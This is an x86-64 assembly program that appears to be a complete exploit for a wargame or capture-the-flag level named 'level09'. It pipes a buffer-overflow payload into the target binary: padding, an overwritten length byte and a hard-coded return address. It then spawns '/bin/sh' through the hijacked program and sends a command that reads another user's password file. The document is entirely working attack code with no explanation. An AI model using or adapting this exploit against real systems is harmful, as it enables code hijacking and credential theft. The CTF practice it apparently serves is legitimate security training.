
format ELF64 executable $03
entry _start

struc string data*& {
    .: db data
    .length = ($ - .)
}

struc timespec {
    .tv_sec: rq $01
    .tv_nsec: rq $01
}

virtual at $00
    timespec timespec
    timespec.sizeof = $
end virtual

segment executable readable
_start:
    and rsp, not $0F
    sub rsp, $08
    mov rax, $16
    mov rdi, rsp
    syscall
    test rax, rax
    jnz .exit
    mov rax, $01
    mov edi, dword [rsp+$04]
    mov rsi, _payload
    mov rdx, _payload.length
    syscall
    mov rax, $21
    mov edi, dword [rsp]
    xor rsi, rsi    
    syscall
    mov rax, $39
    syscall
    test rax, rax
    jz .child
    mov rcx, timespec.sizeof
    sub rsp, rcx
    xor al, al
    mov rdi, rsp
    cld
    rep stosb
    mov byte [rsp+timespec.tv_sec], $01
    mov rax, $23 
    mov rdi, rsp
    xor rsi, rsi
    syscall   
    add rsp, timespec.sizeof
    mov rax, $01
    mov edi, dword [rsp+$04]
    mov rsi, _command
    mov rdx, _command.length
    syscall
    jmp .exit
.child:
    mov rax, $3B
    mov rdi, _program
    xor rdx, rdx
    push rdx rdi
    mov rsi, rsp
    syscall
.exit:
    mov rax, $3C
    xor rdi, rdi
    syscall

segment readable

_program: db "/home/users/level09/level09", $00
_command string "cat /home/users/end/.pass", $0A
_payload:

db $28 dup '_'
db $FF
db $0A

db $C8 dup '_'
dq $55555555488C
db $0A

db "/bin/sh", $0A

_payload.length = ($ - _payload)

